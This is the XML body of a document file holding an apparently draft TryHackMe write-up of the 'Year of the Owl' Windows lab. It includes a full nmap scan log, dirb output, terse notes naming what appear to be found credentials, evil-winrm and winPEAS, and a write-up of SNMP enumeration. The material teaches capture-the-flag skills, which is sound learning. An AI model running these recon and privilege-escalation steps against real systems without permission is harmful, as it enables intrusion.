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d1883" officeooo:paragraph-rsid="001d1883"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001d1883" officeooo:paragraph-rsid="001d1883"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001e8a05" officeooo:paragraph-rsid="001e8a05"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00202ef3" officeooo:paragraph-rsid="00202ef3"/>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T1" style:family="text">
      <style:text-properties officeooo:rsid="00202ef3"/>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map -A -sC -sV -p- 10.10.91.35 -vv <text:s text:c="43"/>1 ⨯</text:p>
      <text:p text:style-name="Standard">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 08:22 IST</text:p>
      <text:p text:style-name="Standard">NSE: Loaded 155 scripts for scanning.</text:p>
      <text:p text:style-name="Standard">NSE: Script Pre-scanning.</text:p>
      <text:p text:style-name="Standard">NSE: Starting runlevel 1 (of 3) scan.</text:p>
      <text:p text:style-name="Standard">Initiating NSE at 08:22</text:p>
      <text:p text:style-name="Standard">Completed NSE at 08:22, 0.00s elapsed</text:p>
      <text:p text:style-name="Standard">NSE: Starting runlevel 2 (of 3) scan.</text:p>
      <text:p text:style-name="Standard">Initiating NSE at 08:22</text:p>
      <text:p text:style-name="Standard">Completed NSE at 08:22, 0.00s elapsed</text:p>
      <text:p text:style-name="Standard">NSE: Starting runlevel 3 (of 3) scan.</text:p>
      <text:p text:style-name="Standard">Initiating NSE at 08:22</text:p>
      <text:p text:style-name="Standard">Completed NSE at 08:22, 0.00s elapsed</text:p>
      <text:p text:style-name="Standard">Initiating Ping Scan at 08:22</text:p>
      <text:p text:style-name="Standard">Scanning 10.10.91.35 [4 ports]</text:p>
      <text:p text:style-name="Standard">Completed Ping Scan at 08:22, 0.23s elapsed (1 total hosts)</text:p>
      <text:p text:style-name="Standard">Initiating Parallel DNS resolution of 1 host. at 08:22</text:p>
      <text:p text:style-name="Standard">Completed Parallel DNS resolution of 1 host. at 08:22, 0.06s elapsed</text:p>
      <text:p text:style-name="Standard">Initiating SYN Stealth Scan at 08:22</text:p>
      <text:p text:style-name="Standard">Scanning 10.10.91.35 [65535 ports]</text:p>
      <text:p text:style-name="Standard">Discovered open port 139/tcp on 10.10.91.35</text:p>
      <text:p text:style-name="Standard">Discovered open port 3306/tcp on 10.10.91.35</text:p>
      <text:p text:style-name="Standard">Discovered open port 443/tcp on 10.10.91.35</text:p>
      <text:p text:style-name="Standard">Discovered open port 445/tcp on 10.10.91.35</text:p>
      <text:p text:style-name="Standard">Discovered open port 3389/tcp on 10.10.91.35</text:p>
      <text:p text:style-name="Standard">Discovered open port 80/tcp on 10.10.91.35</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 4.47% done; ETC: 08:33 (0:11:02 remaining)</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 17.77% done; ETC: 08:28 (0:04:42 remaining)</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 35.09% done; ETC: 08:28 (0:04:17 remaining)</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 41.69% done; ETC: 08:29 (0:03:56 remaining)</text:p>
      <text:p text:style-name="Standard">Discovered open port 47001/tcp on 10.10.91.35</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 49.28% done; ETC: 08:29 (0:03:31 remaining)</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 55.92% done; ETC: 08:29 (0:03:05 remaining)</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 62.89% done; ETC: 08:29 (0:02:43 remaining)</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 69.37% done; ETC: 08:29 (0:02:16 remaining)</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 81.92% done; ETC: 08:29 (0:01:14 remaining)</text:p>
      <text:p text:style-name="Standard">Discovered open port 5985/tcp on 10.10.91.35</text:p>
      <text:p text:style-name="Standard">SYN Stealth Scan Timing: About 90.82% done; ETC: 08:29 (0:00:37 remaining)</text:p>
      <text:p text:style-name="Standard">Completed SYN Stealth Scan at 08:29, 419.42s elapsed (65535 total ports)</text:p>
      <text:p text:style-name="Standard">Initiating Service scan at 08:29</text:p>
      <text:p text:style-name="Standard">Scanning 8 services on 10.10.91.35</text:p>
      <text:p text:style-name="Standard">Completed Service scan at 08:29, 16.87s elapsed (8 services on 1 host)</text:p>
      <text:p text:style-name="Standard">Initiating OS detection (try #1) against 10.10.91.35</text:p>
      <text:p text:style-name="Standard">Retrying OS detection (try #2) against 10.10.91.35</text:p>
      <text:p text:style-name="Standard">Initiating Traceroute at 08:29</text:p>
      <text:p text:style-name="Standard">Completed Traceroute at 08:29, 3.02s elapsed</text:p>
      <text:p text:style-name="Standard">Initiating Parallel DNS resolution of 2 hosts. at 08:29</text:p>
      <text:p text:style-name="Standard">Completed Parallel DNS resolution of 2 hosts. at 08:29, 0.01s elapsed</text:p>
      <text:p text:style-name="Standard">NSE: Script scanning 10.10.91.35.</text:p>
      <text:p text:style-name="Standard">NSE: Starting runlevel 1 (of 3) scan.</text:p>
      <text:p text:style-name="Standard">Initiating NSE at 08:29</text:p>
      <text:p text:style-name="Standard">NSE Timing: About 99.91% done; ETC: 08:30 (0:00:00 remaining)</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>Completed NSE at 08:30, 41.54s elapsed</text:p>
      <text:p text:style-name="Standard">NSE: Starting runlevel 2 (of 3) scan.</text:p>
      <text:p text:style-name="Standard">Initiating NSE at 08:30</text:p>
      <text:p text:style-name="Standard">Completed NSE at 08:30, 2.22s elapsed</text:p>
      <text:p text:style-name="Standard">NSE: Starting runlevel 3 (of 3) scan.</text:p>
      <text:p text:style-name="Standard">Initiating NSE at 08:30</text:p>
      <text:p text:style-name="Standard">Completed NSE at 08:30, 0.00s elapsed</text:p>
      <text:p text:style-name="Standard">Nmap scan report for 10.10.91.35</text:p>
      <text:p text:style-name="Standard">Host is up, received syn-ack ttl 124 (0.21s latency).</text:p>
      <text:p text:style-name="Standard">Scanned at 2021-12-04 08:22:20 IST for 490s</text:p>
      <text:p text:style-name="Standard">Not shown: 65527 filtered tcp ports (no-response)</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="5"/>STATE SERVICE <text:s text:c="6"/>REASON <text:s text:c="9"/>VERSION</text:p>
      <text:p text:style-name="Standard">80/tcp <text:s text:c="3"/>open <text:s/>http <text:s text:c="9"/>syn-ack ttl 124 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)</text:p>
      <text:p text:style-name="Standard">|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10</text:p>
      <text:p text:style-name="Standard">|_http-title: Year of the Owl</text:p>
      <text:p text:style-name="Standard">| http-methods: </text:p>
      <text:p text:style-name="Standard">|_ <text:s/>Supported Methods: GET HEAD POST OPTIONS</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s text:c="2"/>open <text:s/>netbios-ssn <text:s text:c="2"/>syn-ack ttl 124 Microsoft Windows netbios-ssn</text:p>
      <text:p text:style-name="Standard">443/tcp <text:s text:c="2"/>open <text:s/>ssl/http <text:s text:c="5"/>syn-ack ttl 124 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)</text:p>
      <text:p text:style-name="Standard">|_ssl-date: TLS randomness does not represent time</text:p>
      <text:p text:style-name="Standard">|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10</text:p>
      <text:p text:style-name="Standard">| tls-alpn: </text:p>
      <text:p text:style-name="Standard">|_ <text:s/>http/1.1</text:p>
      <text:p text:style-name="Standard">| http-methods: </text:p>
      <text:p text:style-name="Standard">|_ <text:s/>Supported Methods: GET HEAD POST OPTIONS</text:p>
      <text:p text:style-name="Standard">|_http-title: Year of the Owl</text:p>
      <text:p text:style-name="Standard">| ssl-cert: Subject: commonName=localhost</text:p>
      <text:p text:style-name="Standard">| Issuer: commonName=localhost</text:p>
      <text:p text:style-name="Standard">| Public Key type: rsa</text:p>
      <text:p text:style-name="Standard">| Public Key bits: 1024</text:p>
      <text:p text:style-name="Standard">| Signature Algorithm: sha1WithRSAEncryption</text:p>
      <text:p text:style-name="Standard">| Not valid before: 2009-11-10T23:48:47</text:p>
      <text:p text:style-name="Standard">| Not valid after: <text:s/>2019-11-08T23:48:47</text:p>
      <text:p text:style-name="Standard">| MD5: <text:s text:c="2"/>a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0</text:p>
      <text:p text:style-name="Standard">| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6</text:p>
      <text:p text:style-name="Standard">| -----BEGIN CERTIFICATE-----</text:p>
      <text:p text:style-name="Standard">| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls</text:p>
      <text:p text:style-name="Standard">| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD</text:p>
      <text:p text:style-name="Standard">| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj</text:p>
      <text:p text:style-name="Standard">| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o</text:p>
      <text:p text:style-name="Standard">| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT</text:p>
      <text:p text:style-name="Standard">| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD</text:p>
      <text:p text:style-name="Standard">| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd</text:p>
      <text:p text:style-name="Standard">| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL</text:p>
      <text:p text:style-name="Standard">| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=</text:p>
      <text:p text:style-name="Standard">|_-----END CERTIFICATE-----</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s text:c="2"/>open <text:s/>microsoft-ds? syn-ack ttl 124</text:p>
      <text:p text:style-name="Standard">3306/tcp <text:s/>open <text:s/>mysql? <text:s text:c="7"/>syn-ack ttl 124</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>| fingerprint-strings: </text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>GetRequest, Kerberos, NULL, SSLSessionReq, giop: </text:p>
      <text:p text:style-name="Standard">|_ <text:s text:c="3"/>Host 'ip-10-17-18-24.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server</text:p>
      <text:p text:style-name="Standard">| mysql-info: </text:p>
      <text:p text:style-name="Standard">|_ <text:s/>MySQL Error: Host 'ip-10-17-18-24.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server</text:p>
      <text:p text:style-name="Standard">3389/tcp <text:s/>open <text:s/>ms-wbt-server syn-ack ttl 124 Microsoft Terminal Services</text:p>
      <text:p text:style-name="Standard">| ssl-cert: Subject: commonName=year-of-the-owl</text:p>
      <text:p text:style-name="Standard">| Issuer: commonName=year-of-the-owl</text:p>
      <text:p text:style-name="Standard">| Public Key type: rsa</text:p>
      <text:p text:style-name="Standard">| Public Key bits: 2048</text:p>
      <text:p text:style-name="Standard">| Signature Algorithm: sha256WithRSAEncryption</text:p>
      <text:p text:style-name="Standard">| Not valid before: 2021-12-03T02:50:39</text:p>
      <text:p text:style-name="Standard">| Not valid after: <text:s/>2022-06-04T02:50:39</text:p>
      <text:p text:style-name="Standard">| MD5: <text:s text:c="2"/>ea15 d3a7 5687 79e0 d276 2a40 eb88 a80a</text:p>
      <text:p text:style-name="Standard">| SHA-1: c212 227a 8a75 70b0 c6d1 89ff 9071 7f67 2507 653a</text:p>
      <text:p text:style-name="Standard">| -----BEGIN CERTIFICATE-----</text:p>
      <text:p text:style-name="Standard">| MIIC4jCCAcqgAwIBAgIQcX5OJismD51Bb2wOVxL5HzANBgkqhkiG9w0BAQsFADAa</text:p>
      <text:p text:style-name="Standard">| MRgwFgYDVQQDEw95ZWFyLW9mLXRoZS1vd2wwHhcNMjExMjAzMDI1MDM5WhcNMjIw</text:p>
      <text:p text:style-name="Standard">| NjA0MDI1MDM5WjAaMRgwFgYDVQQDEw95ZWFyLW9mLXRoZS1vd2wwggEiMA0GCSqG</text:p>
      <text:p text:style-name="Standard">| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCzyORmez331FKyW7O6rwGDMuTTA503bPKe</text:p>
      <text:p text:style-name="Standard">| Ewd5mXq0oEdlcGgVlnOJ2YPVbnXJ3Q+/YCa6hRbDPDNw8luv7jZg/uFbam5S+3a9</text:p>
      <text:p text:style-name="Standard">| tA0q1Ziv78VpmJR5ve3+fzJ+NxHNyMaPEuIdFucz4BvGm2PAcud9d1BdFY/ZM2vq</text:p>
      <text:p text:style-name="Standard">| fdKvZ9Wq5W1WzifQdBwyZGLQ8Q8ToL3UrVYeJq0iX8YhNurCz4ieXW7evMNJvZOl</text:p>
      <text:p text:style-name="Standard">| UpyMPEjj3oOuGRCss2wNpa/ijjhhYvWFf6TkZ8qAc1e62MNGS8fhpmaNNEfdpwzy</text:p>
      <text:p text:style-name="Standard">| hJ/+s4AIXtnDmSXJeGico5029uXT+bIVo7dpDemRFsnv2ZjhkJNZAgMBAAGjJDAi</text:p>
      <text:p text:style-name="Standard">| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF</text:p>
      <text:p text:style-name="Standard">| AAOCAQEAJ79sy1NemyMNsATPnCFawrQ0LmJZUU/ODIVxxG7ORNBV6s8Jf3LV70AZ</text:p>
      <text:p text:style-name="Standard">| eH+ihzGtQFVxDvPpy+E/GIEukyenVKO0En8wj7SlRlGL266i2AHa3Am7onjgzIfk</text:p>
      <text:p text:style-name="Standard">| +0yvLq4fPbBi6PYsEzhN7k2pMa+Tcl/tJcBIwATaZe0vbEQtVCuaQ4ZQj7bIrkxd</text:p>
      <text:p text:style-name="Standard">| hfNIwUerCKFErUCspP5N9cdBIJR0Dbg1ML9krVL6Vl/bmVxfXG+Bu9K+OZGtKWMS</text:p>
      <text:p text:style-name="Standard">| eq2EmFto/tKBaIoXhhMwc9YraLZVMvE4oBh96tF6YkC9NEzpJ9FUgX8CLFJC1d3A</text:p>
      <text:p text:style-name="Standard">| Oe+Vj4sfzdd1aGBRVhDphtkAds+uFg==</text:p>
      <text:p text:style-name="Standard">|_-----END CERTIFICATE-----</text:p>
      <text:p text:style-name="Standard">|_ssl-date: 2021-12-04T03:02:31+00:00; +2m03s from scanner time.</text:p>
      <text:p text:style-name="Standard">| rdp-ntlm-info: </text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>Target_Name: YEAR-OF-THE-OWL</text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>NetBIOS_Domain_Name: YEAR-OF-THE-OWL</text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>NetBIOS_Computer_Name: YEAR-OF-THE-OWL</text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>DNS_Domain_Name: year-of-the-owl</text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>DNS_Computer_Name: year-of-the-owl</text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>Product_Version: 10.0.17763</text:p>
      <text:p text:style-name="Standard">|_ <text:s/>System_Time: 2021-12-04T03:01:50+00:00</text:p>
      <text:p text:style-name="Standard">5985/tcp <text:s/>open <text:s/>http <text:s text:c="9"/>syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</text:p>
      <text:p text:style-name="Standard">|_http-server-header: Microsoft-HTTPAPI/2.0</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>|_http-title: Not Found</text:p>
      <text:p text:style-name="Standard">47001/tcp open <text:s/>http <text:s text:c="9"/>syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</text:p>
      <text:p text:style-name="Standard">|_http-server-header: Microsoft-HTTPAPI/2.0</text:p>
      <text:p text:style-name="Standard">|_http-title: Not Found</text:p>
      <text:p text:style-name="Standard">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</text:p>
      <text:p text:style-name="Standard">SF-Port3306-TCP:V=7.92%I=7%D=12/4%Time=61AAD988%P=x86_64-pc-linux-gnu%r(NU</text:p>
      <text:p text:style-name="Standard">SF:LL,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-17-18-24\.eu-west-1\.compute\.i</text:p>
      <text:p text:style-name="Standard">SF:nternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mari</text:p>
      <text:p text:style-name="Standard">SF:aDB\x20server")%r(GetRequest,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-17-18</text:p>
      <text:p text:style-name="Standard">SF:-24\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20con</text:p>
      <text:p text:style-name="Standard">SF:nect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,68,"d\0\0\x01</text:p>
      <text:p text:style-name="Standard">SF:\xffj\x04Host\x20'ip-10-17-18-24\.eu-west-1\.compute\.internal'\x20is\x</text:p>
      <text:p text:style-name="Standard">SF:20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%</text:p>
      <text:p text:style-name="Standard">SF:r(Kerberos,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-17-18-24\.eu-west-1\.co</text:p>
      <text:p text:style-name="Standard">SF:mpute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this</text:p>
      <text:p text:style-name="Standard">SF:\x20MariaDB\x20server")%r(giop,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-17-</text:p>
      <text:p text:style-name="Standard">SF:18-24\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20c</text:p>
      <text:p text:style-name="Standard">SF:onnect\x20to\x20this\x20MariaDB\x20server");</text:p>
      <text:p text:style-name="Standard">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</text:p>
      <text:p text:style-name="Standard">Device type: specialized</text:p>
      <text:p text:style-name="Standard">Running (JUST GUESSING): AVtech embedded (87%)</text:p>
      <text:p text:style-name="Standard">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</text:p>
      <text:p text:style-name="Standard">Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)</text:p>
      <text:p text:style-name="Standard">No exact OS matches for host (test conditions non-ideal).</text:p>
      <text:p text:style-name="Standard">TCP/IP fingerprint:</text:p>
      <text:p text:style-name="Standard">SCAN(V=7.92%E=4%D=12/4%OT=80%CT=%CU=%PV=Y%DS=5%DC=T%G=N%TM=61AAD9CE%P=x86_64-pc-linux-gnu)</text:p>
      <text:p text:style-name="Standard">SEQ(SP=FC%GCD=1%ISR=106%TI=I%TS=U)</text:p>
      <text:p text:style-name="Standard">OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS%O6=M506NNS)</text:p>
      <text:p text:style-name="Standard">WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)</text:p>
      <text:p text:style-name="Standard">ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)</text:p>
      <text:p text:style-name="Standard">T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)</text:p>
      <text:p text:style-name="Standard">T2(R=N)</text:p>
      <text:p text:style-name="Standard">T3(R=N)</text:p>
      <text:p text:style-name="Standard">T4(R=N)</text:p>
      <text:p text:style-name="Standard">U1(R=N)</text:p>
      <text:p text:style-name="Standard">IE(R=N)</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Network Distance: 5 hops</text:p>
      <text:p text:style-name="Standard">TCP Sequence Prediction: Difficulty=252 (Good luck!)</text:p>
      <text:p text:style-name="Standard">IP ID Sequence Generation: Incremental</text:p>
      <text:p text:style-name="Standard">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Host script results:</text:p>
      <text:p text:style-name="Standard">| p2p-conficker: </text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>Checking for Conficker.C or higher...</text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>Check 1 (port 23850/tcp): CLEAN (Timeout)</text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>Check 2 (port 41677/tcp): CLEAN (Timeout)</text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>Check 3 (port 40568/udp): CLEAN (Timeout)</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>| <text:s text:c="2"/>Check 4 (port 17967/udp): CLEAN (Timeout)</text:p>
      <text:p text:style-name="Standard">|_ <text:s/>0/4 checks are positive: Host is CLEAN or ports are blocked</text:p>
      <text:p text:style-name="Standard">|_clock-skew: mean: 2m02s, deviation: 0s, median: 2m02s</text:p>
      <text:p text:style-name="Standard">| smb2-security-mode: </text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>3.1.1: </text:p>
      <text:p text:style-name="Standard">|_ <text:s text:c="3"/>Message signing enabled but not required</text:p>
      <text:p text:style-name="Standard">| smb2-time: </text:p>
      <text:p text:style-name="Standard">| <text:s text:c="2"/>date: 2021-12-04T03:01:54</text:p>
      <text:p text:style-name="Standard">|_ <text:s/>start_date: N/A</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">TRACEROUTE (using port 443/tcp)</text:p>
      <text:p text:style-name="Standard">HOP RTT <text:s text:c="6"/>ADDRESS</text:p>
      <text:p text:style-name="Standard">1 <text:s text:c="2"/>201.85 ms 10.17.0.1</text:p>
      <text:p text:style-name="Standard">2 <text:s text:c="2"/>... 4</text:p>
      <text:p text:style-name="Standard">5 <text:s text:c="2"/>202.16 ms 10.10.91.35</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">NSE: Script Post-scanning.</text:p>
      <text:p text:style-name="Standard">NSE: Starting runlevel 1 (of 3) scan.</text:p>
      <text:p text:style-name="Standard">Initiating NSE at 08:30</text:p>
      <text:p text:style-name="Standard">Completed NSE at 08:30, 0.00s elapsed</text:p>
      <text:p text:style-name="Standard">NSE: Starting runlevel 2 (of 3) scan.</text:p>
      <text:p text:style-name="Standard">Initiating NSE at 08:30</text:p>
      <text:p text:style-name="Standard">Completed NSE at 08:30, 0.00s elapsed</text:p>
      <text:p text:style-name="Standard">NSE: Starting runlevel 3 (of 3) scan.</text:p>
      <text:p text:style-name="Standard">Initiating NSE at 08:30</text:p>
      <text:p text:style-name="Standard">Completed NSE at 08:30, 0.00s elapsed</text:p>
      <text:p text:style-name="Standard">Read data files from: /usr/bin/../share/nmap</text:p>
      <text:p text:style-name="Standard">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</text:p>
      <text:p text:style-name="Standard">Nmap done: 1 IP address (1 host up) scanned in 490.29 seconds</text:p>
      <text:p text:style-name="Standard"><text:s text:c="11"/>Raw packets sent: 131455 (5.789MB) | Rcvd: 2128 (464.900K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irb http://10.10.91.35 <text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">-----------------</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">+ http://10.10.91.35/aux (CODE:403|SIZE:301) <text:s text:c="41"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/cgi-bin/ (CODE:403|SIZE:301) <text:s text:c="36"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/com1 (CODE:403|SIZE:301) <text:s text:c="40"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/com2 (CODE:403|SIZE:301) <text:s text:c="40"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/com3 (CODE:403|SIZE:301) <text:s text:c="40"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/con (CODE:403|SIZE:301) <text:s text:c="41"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/examples (CODE:503|SIZE:401) <text:s text:c="36"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/index.php (CODE:200|SIZE:252) <text:s text:c="35"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/licenses (CODE:403|SIZE:420) <text:s text:c="36"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/lpt1 (CODE:403|SIZE:301) <text:s text:c="40"/></text:p>
      <text:p text:style-name="Standard">+ http://10.10.91.35/lpt2 (CODE:403|SIZE:301) <text:s text:c="40"/></text:p>
      <text:p text:style-name="Standard"><text:s text:c="86"/></text:p>
      <text:p text:style-name="Standard">(!) FATAL: Too many errors connecting to host</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>(Possible cause: OPERATION TIMEOUT)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="79"/></text:p>
      <text:p text:style-name="Standard">-----------------</text:p>
      <text:p text:style-name="Standard">END_TIME: Sat Dec <text:s/>4 08:35:07 2021</text:p>
      <text:p text:style-name="Standard">DOWNLOADED: 2531 - FOUND: 11</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P1">openview snmp 161</text:p>
      <text:p text:style-name="P1">jareth <text:span text:style-name="T1">sarah rdp 3389</text:span></text:p>
      <text:p text:style-name="P4">evil winrm</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4">whoami /priv</text:p>
      <text:p text:style-name="P4">sysinfo</text:p>
      <text:p text:style-name="P4">winpeas.bat</text:p>
      <text:p text:style-name="P3">gci -hidden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Year of the Owl (THM)</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Emphasis">TryHackMe</text:span> – </text:p>
      <text:p text:style-name="Standard">Write-Up</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Emphasis">topics</text:span>: UDP enumeration, SNMP, Windows Privilege Escalation, cached files in recycle bin, cracking system.bak/sam.bak</text:p>
      <text:list xml:id="list282324167" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="Strong_20_Emphasis">Enumeration</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:list xml:id="list342916312" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis">Local Privilege Escalation</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:list xml:id="list73513668" text:style-name="L3">
        <text:list-item text:start-value="3">
          <text:p text:style-name="P8"><text:span text:style-name="Strong_20_Emphasis">System Privilege Escalation</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6">new tools: onesixtyone, snmp-check, crackmapexec</text:p>
      <text:p text:style-name="P6">Enumeration</text:p>
      <text:p text:style-name="P6">Initial nmap scan <text:span text:style-name="Source_20_Text">.././autonmap.sh $ip Basic</text:span></text:p>
      <text:p text:style-name="P6">There are six ports open including HTTP(S), SMB, mySQL, RDP, and Windows Remote Management. From the <text:span text:style-name="Source_20_Text">nmap</text:span> scans we know that this is a Windows 64-bit machine. Lets first enumerate HTTP and run directory scans. </text:p>
      <text:p text:style-name="P6">HTTP/HTTPS</text:p>
      <text:p text:style-name="P6">The website has version PHP 7.4.10 and the homepage is simply an owl so lets run directory scans with <text:span text:style-name="Source_20_Text">dirsearch</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">python3 dirsearch.py -u owl.thm -e php,html,txt</text:span></text:p>
      <text:p text:style-name="P6">The scan did not return anything of use so I searched for exploits for the PHP version. It did return CVE-2020-7070 but I could not find an example so I moved on rather than pursue trial and error. This is best practice for lateral enumeration. </text:p>
      <text:p text:style-name="P6">SMB</text:p>
      <text:p text:style-name="P6">Trying to enumerate SMB without credentials does not yield results.</text:p>
      <text:p text:style-name="P6">We will have to come back to SMB once we find credentials. Usually SMB is used to obtain sensitive information for lateral movement or remote connections like SSH or winrm </text:p>
      <text:p text:style-name="P6">UDP Scans</text:p>
      <text:p text:style-name="P6">After finding nothing on the usual low hanging fruit with nothing standing out on the website, lack of SMB access, with the rest of the ports irrelevant or potentially rabbit holes, I reran the nmap scans, this time for UDP ports instead of TCP.</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">nmap -sU --top-ports 10 owl.thm</text:span></text:p>
      <text:p text:style-name="P6">We can see there are many more ports exposed via UDP. We are able to immediately weed out some as a last resort option like DNS (53), NTP (123) and the SMB ports. Port 161 <text:span text:style-name="Strong_20_Emphasis">SNMP</text:span> collects and organizes information about managed devices on networks, meaning that it can sometimes contain sensitive, easily accessible information.</text:p>
      <text:p text:style-name="P6">There are native Kali tools for enumerating SNMP, including snmp-walk, snmp-check, and onesixtyone. Regardless, we require the community string (a user id or password that allows access to a router's or other device's statistics) and can obtain this via <text:span text:style-name="Source_20_Text">onesixtyone</text:span></text:p>
